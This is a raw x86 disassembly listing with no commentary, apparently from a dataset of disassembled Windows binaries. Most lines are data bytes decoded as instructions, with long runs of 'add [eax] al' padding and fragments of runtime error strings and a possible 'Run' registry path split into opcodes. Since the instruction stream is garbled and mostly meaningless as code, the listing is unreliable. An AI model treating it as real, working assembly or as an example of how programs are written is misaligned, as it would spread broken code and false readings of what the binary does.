sub_401139
push ds
inc edx
add [ edx ] bl
pop ds
inc edx
add ah ch
and eax [ edx ]
jge rwxdata
add [ edx + ecx * 8 + 0x4 ] al
add [ edx - 0x36 ] bl
add al 0x0
jo GetStdHandle@IAT
inc edx
add [ edx - 0x28ffbd7b ] ch
test [ edx ] eax
sbb eax [ esi - 0x79a0ffbe ]
inc edx
add [ esi + eax * 4 - 0x7944ffbe ] cl
inc edx
add [ edx ] ah
xchg ebp eax
inc edx
add [ ebp + edx * 4 + 0x42 ] ah
add [ esi - 0x47ffbd6b ] cl
xchg ebp eax
inc edx
add ch ah
xchg ebp eax
inc edx
add [ edx ] dl
xchg esi eax
inc edx
add [ edi ] bh
xchg esi eax
inc edx
add [ ebx - 0x38ffbd6a ] al
xchg esi eax
inc edx
add dh dh
xchg esi eax
inc edx
add [ ebx ] ch
inc edx
add bh ch
cmpsd [ esi ] [ edi ]
inc edx
add [ ebp - 0x56 ] al
inc edx
add [ ecx + 0x42ad ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x408d0042 ] cl
inc edx
add dl al
jo rwxdata
0xaa0004c9 0x4c9
add [ eax - 0x2dfffb37 ] bh
leave
add al 0x0
loop rwxdata
add al 0x0
or dl 0x4
add [ edx + ecx * 8 - 0x355bfffc ] dl
add al 0x0
mov eax 0xc40004ca
0x4
xor [ 0xffffffffae45aa0d ] ah
add dh dh
0x42
add dh dl
enter 0x4 0xe2
enter 0x4 0xf0
enter 0x4 0xc
leave
add al 0x0
leave
add al 0x0
inc eax
leave
add al 0x0
push esi
leave
add al 0x0
outsb
leave
add al 0x0
mov cl cl
add al 0x0
add al 0x0
push es
xchg ebx eax
or ch [ ebx ]
outsd
mov [ esi - 0x2d874e ] ch
jl rwxdata
out 0xa4 al
loopne rwxdata
inc ebx
mov esp 0x829549da
push edi
push edi
inc eax
mov al 0x35
inc eax
add ah 0x25
push ebx
arpl [ esi - 0x64 ] bx
int 0xde
cmpsb [ esi ] [ edi ]
mov dh 0xa
sti
dec edx
fwait
jge rwxdata
scasb [ edi ]
sbb [ ebp - 0x3133b9b ] bl
inc esp
cwde
arpl [ fs : esi - 0x6e231807 ] cx
jae rwxdata
inc eax
mov ah 0xab
adc cl cl
daa
sub al 0x35
leave
int 0xcc
fbstp [ edx - 0x62e7d5f4 ]
and eax 0xb374b070
nop
pop esp
insb
push es
shl [ edx - 0x366fffa ] 0x1
jno rwxdata
int 0x39
vpacksswb ymm2 ymm4 ymm2
mov eax 0xf96d1c30
outsd
add ecx eax
cmp [ eax + eax * 8 + 0x1663b763 ] ebx
push ds
inc ebx
outsd
or eax 0x18ac0fed
dec edx
test al 0x2a
mov bl 0xcd
xor al 0x2c
lea esi [ edx ]
xchg ecx edx
dec ebp
push 0x3d2680fb
out dx eax
mov cl 0xef
mov ebp 0xa1ef1d6f
int3
salc
pushfd
test eax 0x9aa7f69e
insd
shr [ esi - 0x7e1d38f ] cl
out dx al
popfd
ror [ esi - 0x48 ] cl
mov ebp 0x3aae0667
sub edx ebx
mov cl 0x7c
clc
add al 0x14
cmpsb [ esi ] [ edi ]
les eax [ edx ]
aaa
retn
lahf
xor eax [ esp - 0x23330e65 ]
stosd [ edi ]
adc al 0x40
xchg esp ecx
or ecx ecx
les ecx [ ecx + 0x2794d477 ]
dec eax
cwde
push edi
popad
je rwxdata
pop eax
0x794070f0 0x3973
sub_41e28a
div ah
loop rwxdata
or eax 0xb55e05d6
xchg ebx eax
jmp rwxdata
pop es
push 0x8f9899d5
jbe rwxdata
popa
jo rwxdata
cmpsb [ esi ] [ edi ]
xor [ esi - 0x22 ] cl
pop edi
inc esi
sbb bh ah
xchg esi eax
movsd [ edi ] [ esi ]
scasd [ edi ]
add al 0xdf
jae rwxdata
inc esi
add [ ecx + 0x59 ] bl
pop ecx
pop ecx
pop ecx
pop ecx
inc ebp
push edx
push edi
inc esi
pop ecx
dec edx
dec eax
dec esp
imul esi [ ebx + 0x74 ] 0x53000000
outsd
je rwxdata
xor eax [ eax ]
add [ eax ] al
add [ edi + 0x6d ] al
popad
imul ebp [ edx + eax * 2 + 0x61 ] 0x694c2072
jbe rwxdata
dec [ esp + esi * 4 + 0x6f ]
rcl [ ebx + 0x4b7428b5 ] cl
movsd [ edi ] [ esi ]
xchg ah al
mov al 0xe
xchg ebx eax
or [ edx - 0x5d827989 ] ebx
daa
or esi [ edx - 0x5c ]
adc al 0x0
add [ ecx ] dh
popa
dec esp
mov ah 0x6f
stosb [ edi ]
inc edx
pop ebp
cmp eax 0x1dc9a482
mov dh 0xa9
test al 0x5a
inc ebx
add [ eax ] al
add [ eax ] al
inc ebx
push esi
dec ebp
xor al 0x55
popad
jb rwxdata
push edx
inc esi
pop esp
dec ebp
imul esp [ ebx + 0x72 ] 0x666f736f
je rwxdata
inc ebp
push edi
inc esp
push ebx
pop edx
inc ebx
inc ebp
push edi
inc esi
push edx
push edi
imul ebp [ esi + 0x64 ] 0x5c73776f
inc ebx
jne rwxdata
dec ecx
xor edi [ ecx ]
xor cl [ ecx + 0x33 ]
cmp [ edx ] esi
add [ eax ] al
xor dh [ edx ]
xor dl [ ebx + 0x4e ]
dec edx
push ebx
jb rwxdata
push ebx
cmp [ edx + 0x53 ] cl
inc ebx
push esi
dec ebp
xor al 0x55
push ebx
cmp [ edx + 0x53 ] cl
outsb
je rwxdata
inc ebp
push edi
inc esi
jb rwxdata
push ebp
xor ecx [ edx + 0x4b ]
pop eax
inc esp
push ebx
xor dh [ edx ]
xor dl [ ebx + 0x4e ]
xor al [ eax ]
add [ edx ] dh
xor dh [ edx ]
push ebx
dec esi
imul ebp [ edi + 0x6e ] 0x6e75525c
add [ eax ] al
add [ edx ] ah
add [ eax ] al
add [ eax + 0x61 ] dh
jne rwxdata
push ebp
xor ecx [ edx + 0x4b ]
pop eax
inc esp
push ebx
push ebp
dec edx
xor eax 0x55393334
dec edx
xor eax 0x393334
add [ eax ] al
add [ esi + 0x37 ] cl
xor ecx [ eax + 0x53 ]
dec esi
aaa
xor ecx [ eax + 0x53 ]
inc esp
push ebx
push ebx
cmp [ edx ] dh
dec esi
aaa
xor ecx [ eax + 0x53 ]
inc esp
push ebx
push ebx
cmp [ edx ] dh
inc esp
push ebx
push ebx
cmp [ edx ] dh
add [ eax ] al
dec esi
xor [ esi + ecx * 2 ] dh
xor [ ecx * 2 + 0x34304e53 ] dh
dec ebp
push ebx
dec esi
xor [ ecx * 2 + 0x34304e53 ] dh
dec ebp
push ebx
dec esi
xor [ ecx * 2 + 0x34304e53 ] dh
dec ebp
push ebx
dec esi
xor [ ecx * 2 + 0x534d53 ] dh
add [ eax ] al
add [ eax + 0x48 ] cl
dec eax
xor eax 0x48354848
dec eax
dec eax
dec eax
dec eax
xor eax 0x48354848
dec eax
dec eax
xor eax 0x48484848
dec eax
xor eax 0x35484848
dec eax
dec eax
dec eax
dec eax
dec eax
xor eax 0x35484848
dec eax
dec eax
xor eax 0x66356f48
add [ edi + 0x39 ] al
dec esp
inc edi
cmp [ edx + edx * 2 + 0x34 ] ecx
inc edi
cmp [ edx + edx * 2 + 0x34 ] ecx
inc edi
cmp [ edx + edx * 2 + 0x34 ] ecx
inc edi
cmp [ edx + edx * 2 + 0x34 ] ecx
inc edi
cmp [ edx + edx * 2 + 0x34 ] ecx
inc edi
cmp [ edx + edx * 2 + 0x34 ] ecx
inc edi
cmp [ edx + edx * 2 + 0x34 ] ecx
inc edi
cmp [ edx + edx * 2 + 0x34 ] ecx
push edx
xor al 0x0
add [ eax ] al
dec esi
xor al 0x46
push ebx
dec esi
xor al 0x46
push ebx
dec edx
dec esi
xor al 0x46
push ebx
dec edx
dec esi
xor al 0x46
push ebx
dec edx
dec esi
xor al 0x46
push ebx
dec edx
dec esi
xor al 0x46
push ebx
dec edx
dec esi
xor al 0x46
push ebx
dec edx
dec edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
das
inc edx
add [ edx ] al
add [ eax ] al
add [ eax - 0x6fffbdef ] bl
adc [ edx ] eax
mov [ ecx ] dl
inc edx
add [ eax + 0x10004211 ] al
adc al [ edx ]
add [ edx ] dl
inc edx
add [ eax ] al
mov ch 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ch 0x44
add [ ecx ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0xbc00000 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0x4c00000 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x4c00000 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x8c00000 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x8c00000 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x8c00000 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x8c00000 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x8c00000 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x8c00000 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x8c00000 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ edx ] cl
add [ eax ] al
add [ eax + eax - 0x10000 ] cl
push ebx
dec esi
add [ gs : eax ] al
add [ edx + 0x59 ] cl
inc edi
push edi
push edx
inc esi
inc esp
inc esi
inc esp
inc esi
inc esi
inc esi
inc esi
inc esi
inc esi
inc esi
inc esi
inc esi
inc esi
inc esi
inc esi
inc esi
inc esi
inc esi
inc esi
inc esi
inc esi
inc esi
inc esi
inc esi
inc esi
inc esi
inc esi
inc esi
sub_420ec8
fcom [ edi ]
inc edx
add [ eax ] al
add [ eax ] al
add [ esi ] ch
aas
inc ecx
push esi
aas
and al 0x62
popad
jae rwxdata
add [ eax ] al
add [ eax ] al
add [ esi ] ch
aas
inc ecx
push esi
aas
arpl [ edi + 0x69 ] bx
outsd
jae rwxdata
add [ eax ] al
add [ eax ] al
add al bl
pop ss
arpl [ edi + 0x6f ] bx
jae rwxdata
arpl [ eax + 0x61 ] bp
jb rwxdata
inc edi
push ebp
aas
and al 0x63
push 0x745f7261
jb rwxdata
add [ eax ] al
add [ eax ] al
add [ esi ] ch
aas
inc ecx
push esi
popa
arpl [ edi + 0x73 ] bx
je rwxdata
push esi
aas
and al 0x62
popad
jae rwxdata
jb rwxdata
add [ eax ] al
add [ eax ] al
aas
je rwxdata
and al 0x62
popad
jae rwxdata
imul esi [ ebx + esi * 2 + 0x40 ] 0x74734047
inc eax
inc eax
inc eax
jae rwxdata
add [ esi ] ch
aas
bound esp [ ecx + 0x73 ]
jb rwxdata
popad
insd
bound esi [ ebp + 0x66 ]
inc eax
inc edi
push ebp
aas
and al 0x63
push 0x745f7261
jb rwxdata
inc edx
add [ eax ] al
add [ eax ] al
add [ esi ] ch
add [ eax ] al
fcom [ edi ]
popad
insd
inc eax
inc edi
push ebp
aas
and al 0x63
push 0x745f7261
jb rwxdata
add [ ecx ] al
add [ eax ] al
add al bl
arpl [ edi + 0x66 ] bx
imul ebp [ ebp + 0x62 ] 0x47406675
jne rwxdata
popad
jae rwxdata
inc eax
inc eax
add [ eax ] al
add al bl
pop ss
inc edx
add [ eax ] al
add [ eax ] al
add [ esi ] ch
aas
inc ecx
push esi
aas
and al 0x62
popad
jae rwxdata
inc eax
jae rwxdata
add [ eax ] al
add [ eax ] al
add [ esi ] ch
aas
inc ecx
push esi
inc eax
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcom [ edi ]
inc ecx
push esi
insb
outsd
imul esp [ bp + di + 0x5f ] 0x6f727265
jb rwxdata
aas
inc eax
jae rwxdata
inc eax
imul ebp [ edi + 0x73 ] 0x7361625f
imul esi [ ebx + esi * 2 + 0x40 ] 0x74734047
aas
inc ecx
imul esi [ ebx + esi * 2 + 0x40 ] 0x74734047
insb
outsd
arpl [ ecx + 0x6c ] sp
inc eax
jae rwxdata
jo rwxdata
aas
inc ecx
push esi
js rwxdata
imul esi [ ebx + esi * 2 + 0x40 ] 0x74734047
pop ss
inc edx
add [ eax ] al
add [ eax ] al
add [ esi ] ch
push ebp
aas
and al 0x63
push 0x745f7261
jb rwxdata
inc eax
inc edi
jae rwxdata
inc eax
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
pop ss
inc edx
popad
jb rwxdata
inc eax
inc eax
inc eax
jae rwxdata
inc ecx
add [ eax ] al
add [ eax ] al
add al bl
pop ss
arpl [ edi + 0x69 ] bx
jae rwxdata
add [ eax + 0x41 ] dl
push esp
dec eax
add [ eax ] al
add [ eax ] al
arpl [ cs : edi + 0x6d ] bp
inc eax
inc eax
add [ eax ] al
fcom [ edi ]
inc edx
add [ eax ] al
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
inc eax
inc eax
add [ eax ] al
add al bl
pop ss
inc edx
inc edx
add ah ch
retn 0x42
pop edi
jb rwxdata
add [ esi ] ch
aas
inc ecx
push esi
outsd
jne rwxdata
inc eax
inc eax
add [ eax ] al
fcom [ edi ]
inc edx
add [ eax ] al
add [ eax ] al
add [ esi ] ch
aas
popa
arpl [ ebp + 0x74 ] sp
inc eax
inc eax
inc eax
inc eax
inc eax
add [ eax ] al
inc ecx
push esi
pop edi
dec esp
outsd
arpl [ ecx + 0x6d ] bp
add [ eax ] al
aas
imul ebp [ edi + 0x6e ] 0xd8004040
pop ss
inc edx
add [ eax ] al
add [ eax ] al
add [ esi ] ch
aas
inc ecx
push esi
pop edi
jb rwxdata
inc eax
inc eax
add [ eax ] al
jae rwxdata
inc edi
inc eax
jae rwxdata
imul ebp [ ebp + esi * 2 + 0x72 ] 0x6f694065
jae rwxdata
je rwxdata
push esi
aas
and al 0x62
popad
jae rwxdata
jb rwxdata
add [ eax ] cl
or [ eax ] cl
add [ eax ] al
or [ eax ] al
or [ eax ] al
pop es
or [ eax ] al
add [ eax ] al
sub [ eax ] al
outsb
add [ ebp ] dh
insb
add [ eax + eax + 0x29 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] ch
outsb
jne rwxdata
add [ eax ] al
add [ eax ] al
bound esp [ cs : ecx + 0x74 ]
add [ eax ] al
add [ eax ] al
arpl [ cs : ebp + 0x64 ] bp
add [ eax ] al
add [ eax ] al
pop esp
add [ eax ] al
push es
add [ eax ] al
push es
add [ ecx ] al
add [ eax ] al
adc [ eax ] al
add eax [ esi ]
add [ esi ] al
add dl [ eax ]
add al 0x45
inc ebp
inc ebp
add eax 0x5050505
xor eax 0x500030
add [ eax ] al
add [ eax ] ah
sub [ eax ] bh
push eax
pop eax
pop es
or [ eax ] al
aaa
xor [ eax ] dh
push edi
push eax
pop es
add [ eax ] al
and [ eax ] ah
or [ eax ] al
add [ eax ] al
add [ eax ] cl
pushad
push 0x60606060
add [ eax ] al
jo rwxdata
add [ esi ] ch
bound esp [ ecx + 0x74 ]
jo rwxdata
arpl [ edi + 0x6d ] bp
insd
popad
outsb
arpl [ cs : edi + 0x6d ] bp
outsd
jb rwxdata
jmp edx
pop edi
outsd
pop di
jb rwxdata
insb
outsb
je rwxdata
insb
outsd
arpl [ ecx + 0x6c ] sp
inc eax
jae rwxdata
outsb
je rwxdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
pop ss
outsd
jb rwxdata
inc edi
inc eax
jae rwxdata
jb rwxdata
inc eax
inc eax
inc eax
jae rwxdata
inc edx
add [ eax ] al
add [ eax ] al
add [ esi ] ch
aas
add [ eax ] al
add [ eax ] al
add al bl
pop ss
popad
inc edx
add [ eax ] al
add [ eax ] al
add [ esi ] ch
add [ eax ] al
fcom [ edi ]
popad
insd
inc eax
inc edi
push ebp
aas
and al 0x63
push 0x745f7261
jb rwxdata
dec ecx
dec esi
and [ ebp + 0x72 ] ah
jb rwxdata
insb
sub [ eax ] eax
add [ edi + 0x5f ] bl
inc edi
dec esp
dec edi
inc edx
inc ecx
dec esp
pop edi
dec eax
inc ebp
inc ecx
push eax
pop edi
push ebx
inc ebp
dec esp
inc ebp
inc ebx
push esp
inc ebp
inc esp
add [ eax ] al
pop edi
pop edi
dec ebp
push ebx
push esi
inc ebx
push edx
push esp
pop edi
dec eax
inc ebp
inc ecx
push eax
pop edi
push ebx
inc ebp
dec esp
inc ebp
inc ebx
push esp
add [ eax ] al
add [ eax ] al
jb rwxdata
add [ 0x5400000a ] cl
js rwxdata
add [ eax ] al
add [ eax ] al
rwxdata
add [ eax ] al
add [ esi ] ch
arpl [ edi + 0x6d ] bp
retn 0x42
pop edi
imul ebp [ esi + 0x66 ] rwxdata
mov al 0xca
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x42ca ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
0x42
jae rwxdata
dec ebp
push ebx
push eax
inc ebp
inc ebx
add bh bh
add [ eax ] al
inc ebx
dec edi
jae rwxdata
outsb
inc eax
aas
inc ecx
push esi
je rwxdata
inc edx
add [ eax ] al
add [ eax ] al
inc eax
jo rwxdata
insd
jae rwxdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb rwxdata
inc ecx
push esi
add [ eax ] al
aas
inc eax
inc eax
inc eax
jae rwxdata
aas
imul esi [ ebx + esi * 2 + 0x40 ] 0x74734047
inc eax
inc eax
inc eax
jae rwxdata
outsd
je rwxdata
jb rwxdata
je rwxdata
outsb
je rwxdata
imul ebp [ edi + 0x20 ] 0x74696e69
imul esp [ ecx + 0x6c ] 0x74617a69
imul ebp [ edi + 0x6e ] 0xa0d
add [ eax ] al
push edx
xor [ ss : edx ] dh
jb rwxdata
and [ ebp + 0x72 ] ah
jb rwxdata
js rwxdata
add [ edi ] ch
arpl [ eax ] ax
add [ ebx + 0x4f ] al
arpl [ cs : edi + 0x6d ] bp
inc eax
inc eax
add [ eax ] al
fcom [ edi ]
inc edx
add [ eax ] al
add [ eax ] al
fcom [ edi ]
inc eax
inc eax
add al bl
pop ss
inc edx
popad
je rwxdata
outsb
outsb
popad
bound ebp [ ebp + 0x20 ]
je rwxdata
or al [ eax ]
add [ edx + 0x36 ] dl
xor [ edx ] dh
cmp [ 0x75202d0a ] cl
popad
outsb
xor [ edx ] dh
aaa
or eax 0x6e202d0a
outsd
insd
and [ gs : ebp + 0x72 ] ah
jb rwxdata
jb rwxdata
or al [ eax ]
add [ eax ] al
push ebx
dec ecx
dec esi
inc edi
and [ ebp + 0x72 ] ah
jb rwxdata
jb rwxdata
or [ edi ] al
or [ eax ] al
add [ edi ] al
xor [ ss : ecx ] dh
outsd
outsb
or eax 0xa
add [ edx + 0x36 ] dl
xor [ edx ] dh
and [ esi + 0x6f ] ah
push 0x61707320
arpl [ ebp + 0x20 ] sp
outsw
jb rwxdata
xor eax 0x202d0a0d
imul ebp [ edi + 0x20 ] 0x74696e69
and [ ecx + 0x6e ] ch
imul esi [ ecx + ebp * 2 + 0x61 ] 0x657a696c
and [ eax + 0x65 ] ch
popad
jo rwxdata
xor [ ss : edx ] dh
xor al 0xd
or ch [ 0x746f6e20 ]
and [ ebp + 0x6e ] ah
outsd
jne rwxdata
or eax 0x6e202d0a
outsd
outsb
or eax 0xa
add [ edx + 0x36 ] dl
xor [ edx ] dh
jo rwxdata
push 0x61707320
arpl [ ebp + 0x20 ] sp
outsw
jb rwxdata
outsd
jne rwxdata
jb rwxdata
jb rwxdata
or al [ eax ]
add [ eax ] al
je rwxdata
and [ ecx + 0x6e ] ch
imul esi [ ecx + ebp * 2 + 0x61 ] 0x617a696c
outsd
xor [ ss : ecx ] dh
and [ edi + 0x70 ] ch
jbe rwxdata
jb rwxdata
bound ebp [ ebp + 0x20 ]
je rwxdata
or ch [ 0x616e7520 ]
pop edi
outsd
outsb
js rwxdata
or ch [ 0x72757020 ]
and [ gs : esi + 0x69 ] dh
jae rwxdata
and [ esi + 0x6f ] ch
or al [ eax ]
add [ eax ] al
add [ edx + 0x36 ] dl
popad
jb rwxdata
push 0x61707320
arpl [ ebp + 0x20 ] sp
outsw
outsd
jne rwxdata
or ch [ 0x746f6e20 ]
insb
outsd
ja rwxdata
add [ edi + ecx * 2 + 0x4d ] al
inc ecx
or eax 0xa
dec esp
dec edi
push ebx
push ebx
add [ eax ] al
or eax 0x5400000a
and [ ebp + 0x6e ] ah
outsd
or ah [ ecx + 0x62 ]
outsb
outsb
outsd
jne rwxdata
and [ ebp + 0x6e ] ah
insb
and [ gs : ebp + 0x76 ] ah
imul esp [ ebx + 0x65 ] 0xa0d
add [ eax ] al
push edx
xor [ ss : ecx ] dh
cmp [ 0x75202d0a ] cl
outsb
js rwxdata
arpl [ ebp + 0xd ] sp
or al [ eax ]
add [ eax ] al
jb rwxdata
and [ esi + 0x69 ] dh
or eax 0x75202d0a
outsb
je rwxdata
add [ edx + 0x36 ] dl
xor [ ecx ] dh
or eax 0xa
jne rwxdata
add [ eax ] al
add [ eax ] al
push edx
imul esp [ ecx + 0x6c ] 0x74617a69
imul ebp [ edi + 0x6e ] 0xa0d
add [ eax ] al
push edx
xor [ ss : edx ] dh
imul ebp [ fs : edi + 0x20 ] 0x74696e69
jne rwxdata
jb rwxdata
imul ebp [ edi + 0x6e ] 0x6c616320
outsd
je rwxdata
popad
insb
and [ eax + 0x72 ] dh
outsd
or eax 0x3652000a
xor [ eax ] dh
push 0x61707320
arpl [ ebp + 0x20 ] sp
outsw
jb rwxdata
outsd
or al [ eax ]
or eax 0x6e62610a
jo rwxdata
arpl [ gs : ebp + 0x64 ] si
and [ eax + 0x65 ] ch
popad
add [ eax ] al
push edx
xor [ ss : eax ] dh
arpl [ gs : ebp + 0x64 ] si
and [ ebp + 0x75 ] ch
insb
popad
je rwxdata
outsb
and [ ebx + 0x6f ] ah
outsb
jae rwxdata
insb
or eax 0xa
push edx
insb
and [ esi + 0x75 ] ah
outsb
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
and [ ebx + 0x61 ] ah
insb
outsd
je rwxdata
xor [ ecx ] bh
or eax 0x6e202d0a
je rwxdata
jb rwxdata
outsd
jb rwxdata
add [ eax ] al
add [ cs : eax + esi * 2 ] bh
or eax 0xa
push edx
insd
cmp [ 0x6e202d0a ] ecx
insd
xor [ ss : eax ] dh
xor cl [ 0x66202d0a ]
insb
outsd
popad
je rwxdata
outsb
and [ ebp + 0x72 ] dh
insd
imul ebp [ esi + 0x61 ] 0x6e6f6974
or eax 0xa
add [ edx + 0x36 ] dl
je rwxdata
cmp [ 0x6e202d0a ] cl
outsd
xor [ ss : eax ] dh
outsb
outsd
jne rwxdata
xor [ eax ] dh
je rwxdata
or ch [ 0x656e7520 ]
js rwxdata
js rwxdata
and [ ebp + 0x6e ] dh
or al [ eax ]
add [ eax ] al
add [ edx + 0x36 ] dl
xor [ ecx ] dh
aaa
add cl ah
jpo rwxdata
jb rwxdata
outsb
and [ bx + si + 0x6f ] dh
add [ eax ] al
add [ edx ] cl
or al [ eax ]
add [ edx + 0x75 ] dl
outsb
push 0x61707320
arpl [ ebp + 0x20 ] sp
outsw
jb rwxdata
outsd
jne rwxdata
and [ ebp + 0x6e ] ah
jb rwxdata
add [ ebp + 0x69 ] cl
arpl [ edx + 0x6f ] si
jae rwxdata
or eax 0xa
push 0x61707320
arpl [ ebp + 0x20 ] sp
jb rwxdata
js rwxdata
je rwxdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ eax + 0x1a ] dl
inc edx
add [ ecx + 0x51004290 ] bl
mov [ edx ] es
xchg [ ebp - 0x64f2ffbe ] ecx
add bh bh
jb rwxdata
insd
and [ esi + 0x61 ] ch
insd
and [ gs : ebp + 0x6e ] dh
add [ eax ] al
inc edi
je rwxdata
je rwxdata
insb
insd
and [ gs : ebp + 0x72 ] al
jb rwxdata
jo rwxdata
